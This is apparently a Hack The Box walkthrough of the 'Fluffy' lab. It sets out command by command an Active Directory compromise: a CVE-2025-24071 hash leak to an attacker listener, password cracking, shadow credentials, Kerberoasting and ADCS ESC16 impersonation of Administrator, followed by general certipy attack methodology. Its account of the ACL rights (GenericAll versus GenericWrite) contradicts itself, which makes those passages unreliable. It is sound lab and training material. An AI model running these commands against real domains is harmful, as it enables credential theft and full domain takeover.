

**Box:** Windows AD, assumed breach. Target `10.129.232.88` = `dc01.fluffy.htb` (domain `fluffy.htb`). 
**Given cred:** `j.fleischman:J0elTHEM4n1990!` -----> exploit ESC16.

> Kit: nxc, impacket, bloodyAD, Responder, certipy. Tools over proxychains where possible.

## Setup (do first or Kerberos/BloodHound break)

```bash
echo '10.129.232.88 dc01.fluffy.htb fluffy.htb' | sudo tee -a /etc/hosts
sudo ntpdate 10.129.232.88
```

## Phase 1 — Enumerate with the given cred

```bash
nxc smb   10.129.232.88 -u j.fleischman -p 'J0elTHEM4n1990!'            # valid, not admin
nxc smb   10.129.232.88 -u j.fleischman -p 'J0elTHEM4n1990!' --shares   # IT = READ + WRITE
nxc ldap  10.129.232.88 -u j.fleischman -p 'J0elTHEM4n1990!' --bloodhound -c All --dns-server 10.129.232.88
```

- BloodHound: j.fleischman is only **Domain Users**, **no outbound ACLs** → dead end on ACLs.
- But **IT share is writable** → pivot is a coerced-hash attack, not an ACL path.

> `nxc ldap ... --bloodhound -c All` is nxc's built-in collector — it makes the same zip as `bloodhound-python`, so you don't need to run bloodhound-python separately. Import the zip (nxc prints its path) into the BloodHound GUI.
> 
> Fallback if nxc's collector errors: `bloodhound-python -u j.fleischman -p 'J0elTHEM4n1990!' -d fluffy.htb -ns 10.129.232.88 -c All --zip`

---
## Phase 2 — The IT share → CVE-2025-24071

Files in `IT`: KeePass installer (distraction) + **`Upgrade_Notice.pdf`**.

```bash
impacket-smbclient fluffy.htb/j.fleischman:'J0elTHEM4n1990!'@10.129.232.88
# > use IT
# > get Upgrade_Notice.pdf
pdftotext Upgrade_Notice.pdf - | less       # read it properly, NOT in nano
```

- PDF `/Author (p.agila)` → another user: **p.agila**.
- PDF lists CVEs → the exploitable one is **CVE-2025-24071** (`.library-ms` NTLM leak on folder browse).

---
## Phase 3 — Leak p.agila's hash

```bash
# 1. listener
sudo responder -I tun0

# 2. build the malicious .library-ms (PoC: github.com/0x6rss/CVE-2025-24071_PoC)
python3 p.py -f exploit -i 10.10.15.249      # -i = YOUR IP

# 3. drop it in the writable share
impacket-smbclient fluffy.htb/j.fleischman:'J0elTHEM4n1990!'@10.129.232.88
# > use IT
# > put exploit.library-ms
```

- p.agila browses the share on a timer → Responder catches **p.agila NTLMv2**.

```bash
hashcat -m 5600 pagila.hash /usr/share/wordlists/rockyou.txt
# → p.agila : prometheusx-303
```

---
## Phase 4 — p.agila's ACLs (re-run BloodHound as p.agila)

```bash
nxc ldap 10.129.232.88 -u p.agila -p 'prometheusx-303' --bloodhound -c All --dns-server 10.129.232.88
```

Confirmed path (one extra group hop):

```
p.agila ─[MemberOf]→ SERVICE ACCOUNT MANAGERS ─[GenericAll]→ SERVICE ACCOUNTS ─[GenericAll]→ ca_svc / ldap_svc / winrm_svc
```
- p.agila is already in **Service Account Managers**.
- That group has **GenericAll over the `Service Accounts` group**.
- `Service Accounts` has **GenericAll over `ca_svc`, `ldap_svc`, `winrm_svc`**.

### Abuse: add p.agila to Service Accounts (kit: bloodyAD)

```bash
bloodyAD --host 10.129.232.88 -d fluffy.htb -u p.agila -p 'prometheusx-303' add groupMember "Service Accounts" p.agila

# verify it took
bloodyAD --host 10.129.232.88 -d fluffy.htb -u p.agila -p 'prometheusx-303' get object "Service Accounts" --attr member
```

Now p.agila inherits GenericAll over the three svc accounts → shadow credentials next.

---
## Phase 5 — Get into a service account → user flag

p.agila (via Service Accounts) has **GenericWrite** over the svc accounts — **NOT GenericAll**. This matters: GenericWrite can't reset a password. It can only write attributes.

**What each right lets you do:**

| Right | Reset password | Shadow creds (write `msDS-KeyCredentialLink`) | Targeted Kerberoast (write SPN) |
|---|---|---|---|
| **GenericAll** | ✅ | ✅ | ✅ |
| **GenericWrite** | ❌ | ✅ | ✅ |

So with **GenericWrite** your two real moves are **Option B (shadow creds)** or **Option C (targeted Kerberoast)**. Option A only works if you later get GenericAll somewhere.

### Option A — Reset the password (needs GenericAll, won't work here)

```bash
bloodyAD --host 10.129.232.88 -d fluffy.htb -u p.agila -p 'prometheusx-303' set password winrm_svc 'NewPass123!'
evil-winrm -i 10.129.232.88 -u winrm_svc -p 'NewPass123!'
```

- **What it does:** overwrites the password with one you choose.
- **Needs:** GenericAll / ForceChangePassword. With only GenericWrite it fails ("Password can't be changed").
- Also note: LDAP password set needs an **encrypted channel** — add `--secure` (LDAPS) or use `-k` (Kerberos), or it errors even with GenericAll.
- **Good:** simplest, pure kit. **Bad:** destructive, loud. **Use when:** you have GenericAll, on HTB/lab.

### Option B — Shadow Credentials (certipy) ← best with GenericWrite

```bash
# writes one attribute (msDS-KeyCredentialLink), pulls the CURRENT NT hash
certipy shadow auto -u p.agila@fluffy.htb -p 'prometheusx-303' -account winrm_svc -dc-ip 10.129.232.88 -dc-host dc01.fluffy.htb

evil-winrm -i 10.129.232.88 -u winrm_svc -H '<NTHASH>'       # user flag
```

- **What it does:** adds a fake "key credential" to the account, then uses PKINIT to recover its **current** NT hash.
- **Needs:** GenericWrite (enough), and ADCS/PKINIT working on the DC.
- **Good:** gives the hash **directly — no cracking**, password untouched, quiet.
- **Bad:** fails if PKINIT isn't available (no KDC cert).
- **Use when:** you have GenericWrite and the DC has a CA (Fluffy does). **This is the pick here.**

### Option C — Targeted Kerberoast (bloodyAD + impacket) ← fallback

```bash
# 1. bloodyAD writes a fake SPN (GenericWrite allows this)
bloodyAD --host 10.129.232.88 -d fluffy.htb -u p.agila -p 'prometheusx-303' set object winrm_svc servicePrincipalName -v 'fake/svc'

# 2. impacket requests the ticket (bloodyAD CAN'T do this part)
impacket-GetUserSPNs fluffy.htb/p.agila:'prometheusx-303' -dc-ip 10.129.232.88 -request-user winrm_svc -outputfile winrm.hash

# 3. crack it
hashcat -m 13100 winrm.hash /usr/share/wordlists/rockyou.txt

# 4. cleanup the fake SPN
bloodyAD --host 10.129.232.88 -d fluffy.htb -u p.agila -p 'prometheusx-303' set object winrm_svc servicePrincipalName
```

- **What it does:** forces the account to become Kerberoastable, then you crack the ticket offline.
- **Needs:** GenericWrite (enough). No PKINIT needed.
- **Good:** works even if ADCS/PKINIT is broken. **Bad:** you get a **crackable TGS hash, not the NT hash** — only works if the password is **weak**. Service accounts often aren't.
- **Use when:** shadow creds fails (no PKINIT) AND you think the password might be weak.

### Which is better?
| | A: Reset | B: Shadow creds | C: Kerberoast |
|---|---|---|---|
| Right needed | GenericAll | GenericWrite | GenericWrite |
| Tool | bloodyAD | certipy | bloodyAD + impacket |
| You get | new password | **NT hash directly** | TGS hash to crack |
| Cracking needed? | no | **no** | yes (weak pw only) |
| Needs PKINIT? | no | **yes** | no |
| Breaks account? | yes | no | no |

> **Decision for GenericWrite:** try **B (shadow creds)** first — hash directly, nothing breaks. If PKINIT errors, fall back to **C (Kerberoast)** and hope for a weak password. **A** is only for when you have GenericAll.

---
## Phase 5b — Get winrm_svc's hash → user flag (no cracking)

Shadow creds gives the **NT hash directly**, so you pass-the-hash — don't try to crack it.

```bash
nxc winrm 10.129.232.88 -u winrm_svc -H '33bd09dcd697600edf6b3a7af4875767'   # (Pwn3d!)

evil-winrm -i 10.129.232.88 -u winrm_svc -H '33bd09dcd697600edf6b3a7af4875767'
# type C:\Users\winrm_svc\Desktop\user.txt
```
 
> **Why no mimikatz here:** winrm_svc is a plain user on the DC (WinRM `(Pwn3d!)` = "can run commands", NOT admin). mimikatz needs admin/SYSTEM, so it fails. And on a DC you'd never need it — DA = DCSync. Path to root is ADCS, not local privesc.

---
## Phase 6 — ADCS → Domain Admin (ca_svc, ESC16)

**Why ca_svc:** of the three svc accounts,  bloodhound tells, ca_svc is a member of **Cert Publishers** → it has **Enroll** rights on the Certificate Authority. Certs are an auth method in AD, so controlling enrollment is a route to impersonate anyone.

### Step 1 — get ca_svc's hash (same shadow-cred trick)

```bash
certipy shadow auto -u p.agila@fluffy.htb -p 'prometheusx-303' -account ca_svc -dc-ip 10.129.232.88 -dc-host dc01.fluffy.htb
# → ca_svc NT hash: ca0f4f9e9eb8a092addf53bb03fc98c8
```

### Step 2 — find what's vulnerable

```bash
certipy find -u ca_svc@fluffy.htb -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.129.232.88 -dc-host dc01.fluffy.htb -vulnerable -stdout
```

**What the output told us (in one line):** the CA `fluffy-DC01-CA` is vulnerable to **ESC16 — "Security Extension is disabled"**.

- Normally a cert bakes in the requester's *real* identity (the security extension). With it turned **off on the whole CA**, that check is gone — so you can request a cert and claim to be **anyone, including Administrator**, and the DC believes it.
- Web Enrollment HTTP/HTTPS = False → the two "web enrollment timed out" errors are harmless (they only rule out ESC8, which we don't need).
- ca_svc has **Enroll** → that's exactly the right needed to request a cert.

> **What's a UPN?** 
> 
> User Principal Name = a user's login name in email form (`administrator@fluffy.htb`), just an attribute on the account. When you request a cert, the CA uses your UPN to decide **who the cert is for**. Normally a security extension also stamps your real SID in and the DC cross-checks the two — but ESC16 disables that extension, so the DC trusts **only the UPN**. The exploit = lie about your UPN. (We set it to bare `administrator`, not the full form, since a UPN must be unique and the real admin already uses `administrator@fluffy.htb`. Restore it after so ca_svc isn't broken.)

### Step 3 — exploit ESC16 (impersonate Administrator)

```bash
# a) save ca_svc's real UPN first (to restore later)
certipy account -u ca_svc@fluffy.htb -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.129.232.88 -user ca_svc read

# b) change ca_svc's UPN to administrator (this is the spoof)
certipy account -u ca_svc@fluffy.htb -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.129.232.88 -user ca_svc -upn administrator update

# c) request a cert as ca_svc — because UPN now = administrator, the cert is for Administrator
certipy req -u ca_svc@fluffy.htb -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.129.232.88 -dc-host dc01.fluffy.htb -ca fluffy-DC01-CA -template User

# d) restore ca_svc's UPN (cleanup — note in report)
certipy account -u ca_svc@fluffy.htb -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.129.232.88 -user ca_svc -upn ca_svc update
```

### Step 4 — turn the cert into the Administrator hash

```bash
certipy auth -pfx administrator.pfx -dc-ip 10.129.232.88

#or to specify more

certipy auth -pfx administrator.pfx -dc-ip 10.129.232.88 -username administrator -domain fluffy.htb

# → prints Administrator's NT hash
```

### Step 5 — Domain Admin shell → root flag

```bash
evil-winrm -i 10.129.232.88 -u administrator -H '<ADMIN_HASH>'
# type C:\Users\Administrator\Desktop\root.txt
```

---

## Chain in one line

`j.fleischman → writable IT share → CVE-2025-24071 leaks p.agila → crack (prometheusx-303) → in Service Account Managers (GenericAll over Service Accounts group) → add self to Service Accounts (GenericWrite over svc accounts) → shadow creds winrm_svc → WinRM (user) → shadow creds ca_svc → ADCS ESC16 (UPN spoof) → Administrator cert → DA hash → root`

## Why each account, in one line each

- **j.fleischman** — the given cred; only gets you a writable share.
- **p.agila** — PDF author; their hash leaks via the share; has the first ACL path.
- **Service Accounts group** — the hinge: being *in* it gives GenericWrite over the three svc accounts.
- **winrm_svc** — in Remote Management Users → the only one that gives a **shell** (user flag).
- **ca_svc** — in Cert Publishers → Enroll on the CA → the **ADCS ESC16** route to DA.
- **ldap_svc** — no special rights → skipped.

> **Verify as you go** — all phases confirmed this session except the final ESC16 request/auth. Re-check the exact ESC in `certipy find -vulnerable` before running, in case HTB changes details.


---
---

# Using an unknown PoC (general method)

When you find a GitHub PoC with no obvious instructions:

1. **`python3 p.py -h` / `--help` first** — argparse scripts document themselves.
2. **Read the repo README** — it has the example command and explains the concept.
3. **`head -40 script.py`** — comments + the argparse block show each flag, often with an example.
4. **Still unclear?** search `"<CVE>" exploit walkthrough` / `"<CVE>" github` — a writeup explains the _idea_; `-h` explains the _flags_.
5. **Map inputs to your situation:** an IP flag is almost always **your** listener IP; a target/host flag is the victim. A filename flag is usually cosmetic.



---
---
# Certipy & ADCS (methodology, any box)

**What it is:** certipy is the go-to tool for **AD Certificate Services (ADCS)** — find CA/template misconfigs, request certs, and abuse them.

**Why certs are dangerous:** a certificate is an auth mechanism in AD. Get a cert for a user → authenticate as them **without their password**, and the cert keeps working **even after they change their password**. That's why ADCS attacks are so strong.

**Install:**
```bash
pipx install certipy-ad
```

## When do I reach for certipy?

Three triggers:

1. **BloodHound shows an ADCS edge** — nodes like `ADCS`, `Enroll`, `CertTemplate`, `Enterprise CA`; edges `ADCSESC1`…`ADCSESC16`, `ManageCA`, `ManageCertificates`. BloodHound often names the ESC.
2. **A CA exists** (even with no BloodHound edge) — confirm with `nxc ldap <DC> -u user -p 'pass' -M adcs` ("Found PKI Enrollment Server") then `certipy find -vulnerable`.
3. **You have write over an account but can't reset its password** (only GenericWrite, or you want to stay quiet) → `certipy shadow` to get its hash.

**Decision flow:**

```
new creds → run BloodHound + certipy find -vulnerable
   ├─ ADCS edge / vulnerable template or CA?  → certipy (ESC exploit)
   ├─ write over an account, no pw reset?      → certipy shadow (get hash)
   └─ neither                                   → ignore certipy, use normal ACL/kit path
```

**Habit:** on every AD box, after your first cred, run `certipy find -vulnerable` once. Cheap, and it instantly says whether ADCS is in play. Nothing found → forget certipy. An ESC named → usually your path to DA.

## The 4 commands you actually use

```bash
# 1. what's exploitable? (CA + templates)
certipy find -u user@domain -p 'pass' -dc-ip <IP> -vulnerable -stdout

# 2. steal an account's NT hash (needs write rights over that account)
certipy shadow auto -u user@domain -p 'pass' -account <target> -dc-ip <IP>

# 3. request a malicious cert (the ESC exploit itself — flags depend on which ESC)
certipy req -u user@domain -p 'pass' -dc-ip <IP> -ca <CA_NAME> -template <TEMPLATE> ...

# 4. turn a cert into an NT hash / TGT (authenticate as whoever the cert is for)
certipy auth -pfx <user>.pfx -dc-ip <IP>
```

Auth works with a hash too: `-hashes :<NTHASH>` instead of `-p 'pass'`.

## Two separate techniques (don't confuse them)

**A. Shadow Credentials** — NOT about the CA.

You have **write** over an account (GenericAll / GenericWrite / write to `msDS-KeyCredentialLink`). You add a fake key credential, then PKINIT pulls that account's **NT hash**. No password reset, no cracking.

```bash
certipy shadow auto -u you@domain -p 'pass' -account victim_svc -dc-ip <IP>
# → prints victim_svc NT hash → evil-winrm -i <IP> -u victim_svc -H '<hash>'
```
> Needs the DC to have a KDC cert (PKINIT). If it errors about PKINIT, fall back to password-reset or targeted Kerberoast instead.


**B. ESC exploits** — abusing a misconfigured CA/template to get a cert **as Administrator**.

```bash
certipy find ... -vulnerable -stdout     # tells you WHICH ESC applies
certipy req ...                          # request the cert per that ESC
certipy auth -pfx administrator.pfx ...  # → Administrator NT hash → DA
```

## ESC quick reference (what each means)

| ESC | Misconfig | Core idea |
|---|---|---|
| **ESC1** | Template lets enrollee supply **any SAN** + client auth | request a cert with SAN = administrator |
| **ESC2** | Template has **Any Purpose** EKU | use it to auth as anyone |
| **ESC3** | Enrollment Agent template | request on behalf of another user |
| **ESC4** | You have **write** over a template | edit it to be ESC1, then exploit |
| **ESC6** | CA flag `EDITF_ATTRIBUTESUBJECTALTNAME2` | SAN injection on any template |
| **ESC7** | You have rights over the **CA** itself | approve your own requests / enable ESC6 |
| **ESC8** | **HTTP enrollment** endpoint | NTLM relay to the CA web enrollment |
| **ESC9/10** | weak cert mapping | relax mapping → impersonate |
| **ESC16** | CA has **security extension disabled** | set UPN to administrator, enroll, auth |

**Always run `certipy find -vulnerable` first** — it names the exact ESC so you don't guess.

## Pattern to remember

- Write over an **account** → **shadow credentials** → their hash.
- A vulnerable **template / CA** → **ESC** → cert as Administrator → DA.
